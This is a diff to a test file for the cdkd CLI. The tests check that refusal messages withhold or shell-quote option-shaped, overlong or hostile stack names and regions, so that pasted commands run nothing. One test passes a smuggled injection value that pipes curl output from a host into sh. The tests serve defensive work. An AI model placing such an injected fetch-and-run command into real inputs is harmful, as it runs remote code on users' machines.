@@ -1,4 +1,6 @@
 import { describe, expect, it } from 'vite-plus/test';
+import { PASTE_PAYLOADS, spansThatRun, withPasteDir } from '../utils/paste-harness.js';
+import { shellQuote } from '../../../src/utils/pasteable-command.js';
 import { mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
 import { execFileSync, spawnSync } from 'node:child_process';
 import { tmpdir } from 'node:os';
@@ -4810,8 +4812,9 @@ describe('the malformed-properties texts (issue go-to-k/cdkd#3191)', () => {
     it(`${build.name} refuses to name a HOSTILE region bare in its command`, () => {
       const text = build('S', "r'; curl http://x|sh; echo '", ['A']);
       if (build === malformedOrphanResourcePropertiesRefusalMessage) {
-        // The `cdkd orphan` properties refusal keeps its OWN copy of the gate
-        // (go-to-k/cdkd#3436's remaining half): exact, so named shell-quoted.
+        // The `cdkd orphan` properties refusal builds through the shared gate
+        // WITHOUT `plainIdent` (go-to-k/cdkd#3523 carries why): exact and not
+        // `-`-leading, so named shell-quoted.
         expect(text).toMatch(/--stack-region 'r'\\''/);
       } else {
         // Through the shared gate: renders exactly, so exactness alone would
@@ -5200,6 +5203,146 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
       const text = malformedOrphanResourcePropertiesRefusalMessage('S', 'us-east-1 ', ['A']);
       expect(dropOf(text)).toBe('cdkd state orphan \'<stack>\' --stack-region \'<region>\'');
       expect(text).toContain(HINT);
+    });
+
+    describe('a name or region beginning with - (go-to-k/cdkd#3436, through the shared gate)', () => {
+      const NO_FILL =
+        "the stack name above begins with a '-', which 'cdkd state orphan' could parse as an " +
+        'option, so the command lines below leave it a quoted hole that must NOT be filled with ' +
+        'that name: repair or remove the record by hand';
+      const inspectOf = (text: string) =>
+        /^Inspect the record: (cdkd state show .*)$/m.exec(text)?.[1];
+
+      it('withholds a leading-- NAME from both commands, and says not to fill it back in', () => {
+        // `--all` renders EXACTLY, so this module's own copy SUBSTITUTED it;
+        // Commander reads that argv entry in the positional as the option,
+        // quoted or not. The region is named: it is not what was refused.
+        const text = malformedOrphanResourcePropertiesRefusalMessage('--all', 'us-east-1', ['A']);
+        expect(dropOf(text)).toBe("cdkd state orphan '<stack>' --stack-region us-east-1");
+        expect(inspectOf(text)).toBe("cdkd state show '<stack>' --stack-region us-east-1 --json");
+        expect(text).toContain(`${NO_FILL}.`);
+        // No listing and no fill-in instruction: both lead back to the name.
+        expect(text).not.toContain('Find the exact name');
+        expect(text).not.toContain(HINT_HOW);
+      });
+
+      it('keys that on the RAW leading -, not on the reason the gate reports first', () => {
+        // Past the cap, the gate says `too-long` before `option-shaped`.
+        const text = malformedOrphanResourcePropertiesRefusalMessage(
+          `--${'x'.repeat(STACK_REF_MAX_CODE_POINTS)}`,
+          'us-east-1',
+          ['A']
+        );
+        expect(text).toContain(`${NO_FILL}.`);
+        expect(text).not.toContain(HINT_HOW);
+        expect(text).not.toContain('Find the exact name');
+        // And when the gate calls it ALTERED first (a trailing space).
+        const altered = malformedOrphanResourcePropertiesRefusalMessage('-x ', 'us-east-1', ['A']);
+        expect(altered).toContain(`${NO_FILL}.`);
+        expect(altered).not.toContain(HINT_HOW);
+        expect(altered).not.toContain('Find the exact name');
+      });
+
+      it('on a legacy region-less record too, where the drop command is the only command', () => {
+        const text = malformedOrphanResourcePropertiesRefusalMessage('-x', undefined, ['A']);
+        expect(text).toContain(`${NO_FILL}.`);
+        // The WHOLE trailing set: the drop command is the only command (no
+        // listing), and the object key still names the record — a key segment
+        // beginning with `-` is that record's key, so it keeps `rendersExactly`.
+        expect(text.split('\n').slice(1)).toEqual([
+          "Drop the record: cdkd state orphan '<stack>'",
+          "Object key: '<prefix>/-x/state.json'",
+        ]);
+      });
+
+      it('sends only the REGION to the listing when it is withheld as well', () => {
+        const text = malformedOrphanResourcePropertiesRefusalMessage('-x', 'us-east-1 ', ['A']);
+        expect(dropOf(text)).toBe("cdkd state orphan '<stack>' --stack-region '<region>'");
+        expect(text).toContain(
+          `${NO_FILL}, taking the region from the 'Find the exact name' command below.`
+        );
+        expect(text).toMatch(/^Find the exact name: cdkd state list --json$/m);
+      });
+
+      it('holds a leading-- REGION too, but says only that cdkd refuses it, and lets it be filled', () => {
+        // `--stack-region -x` is the flag's VALUE to Commander (measured), so
+        // the gate's refusal is conservative and the sentence claims no more.
+        const text = malformedOrphanResourcePropertiesRefusalMessage('S', '-x', ['A']);
+        expect(dropOf(text)).toBe("cdkd state orphan '<stack>' --stack-region '<region>'");
+        expect(inspectOf(text)).toBe(
+          "cdkd state show '<stack>' --stack-region '<region>' --json"
+        );
+        expect(text).toContain(
+          "the region above begins with a '-', which cdkd refuses to print as an argument, so " +
+            `take the stack name and region from the 'Find the exact name' command below — ${HINT_HOW}`
+        );
+        expect(text).not.toContain('did not render exactly');
+        expect(text).toMatch(/^Find the exact name: cdkd state list --json$/m);
+        // ONLY when the name was named: an altered name beside it keeps the
+        // sentence that explains the name too.
+        const both = malformedOrphanResourcePropertiesRefusalMessage('S ', '-x', ['A']);
+        expect(both).toContain('the stack name or region above did not render exactly');
+        expect(both).not.toContain('the region above begins with');
+      });
+
+      it('withholds a name or region past the cap that ENDS in ..., which the old copy named', () => {
+        // `safeIdentifier` marks a cut with `...`, so the old exactness copy
+        // compared this against its own truncation, found them equal, and
+        // substituted it; the gate measures the cap itself.
+        const over = `${'q'.repeat(STACK_REF_MAX_CODE_POINTS)}...`;
+        for (const [name, region] of [
+          [over, 'us-east-1'],
+          ['S', over],
+        ] as const) {
+          const text = malformedOrphanResourcePropertiesRefusalMessage(name, region, ['A']);
+          const where = region === over ? "'<region>'" : region;
+          expect(dropOf(text)).toBe(`cdkd state orphan '<stack>' --stack-region ${where}`);
+          expect(inspectOf(text)).toBe(`cdkd state show '<stack>' --stack-region ${where} --json`);
+          // Its own sentence, keyed on the gate's `too-long` rather than on the
+          // prose: a stack name here prints whole (it is its own truncation),
+          // so "did not render exactly" would be false of it, while the cap
+          // sentence is true of both rows.
+          expect(text).toContain(
+            'the stack name or region above is too long to name in a command, so ' + HINT
+          );
+          expect(text).not.toContain('did not render exactly');
+        }
+        // An ALTERED value beside it keeps the rendering sentence, which is
+        // true of that one.
+        const mixed = malformedOrphanResourcePropertiesRefusalMessage('S ', over, ['A']);
+        expect(mixed).toContain('the stack name or region above did not render exactly');
+        expect(mixed).not.toContain('too long to name in a command');
+      });
+
+      it('pastes nothing runnable from the remedy sentence and its command lines, named or withheld', () => {
+        const cases: Array<{ name: string; text: string }> = [];
+        for (const { value } of PASTE_PAYLOADS) {
+          for (const name of [value, `-${value}`]) {
+            cases.push({
+              name,
+              text: malformedOrphanResourcePropertiesRefusalMessage(name, 'us-east-1', ['A']),
+            });
+          }
+        }
+        withPasteDir((dir) => {
+          for (const { name, text } of cases) {
+            // The argv, not just the effect: the harness's `cdkd` is a stub,
+            // so a SUBSTITUTED `-`-leading payload would paste inert too.
+            const expected = name.startsWith('-') ? "'<stack>'" : shellQuote(name);
+            expect(dropOf(text), name).toBe(
+              `cdkd state orphan ${expected} --stack-region us-east-1`
+            );
+            expect(inspectOf(text), name).toBe(
+              `cdkd state show ${expected} --stack-region us-east-1 --json`
+            );
+            // From the remedy sentence on: the lead above it quotes the name
+            // in the module's own prose, a shape outside this fold-in.
+            const at = text.indexOf('No state was written');
+            expect(at, text).toBeGreaterThan(-1);
+            expect(spansThatRun(text.slice(at), dir), text).toEqual([]);
+          }
+        });
+      }, 120_000);
     });
 
     it('CHARACTERISES the ungated forgery this message still carries (go-to-k/cdkd#3523)', () => {
